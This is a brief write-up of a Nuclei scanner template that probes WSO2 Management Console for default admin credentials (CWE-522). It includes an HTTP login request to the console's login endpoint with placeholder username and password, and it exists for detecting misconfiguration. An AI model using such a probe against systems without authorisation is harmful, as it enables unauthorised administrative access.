# Nuclei Template: WSO2 Management Console Default Login
**Template ID:** wso2-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`wso2-default-login.yaml`)

## Vulnerability Information & PoC

## Description
WSO2 Management Console default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /carbon/admin/login_action.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}
```

## References
- https://docs.wso2.com/display/UES100/Accessing+the+Management+Console
- https://is.docs.wso2.com/en/5.12.0/learn/multi-attribute-login/
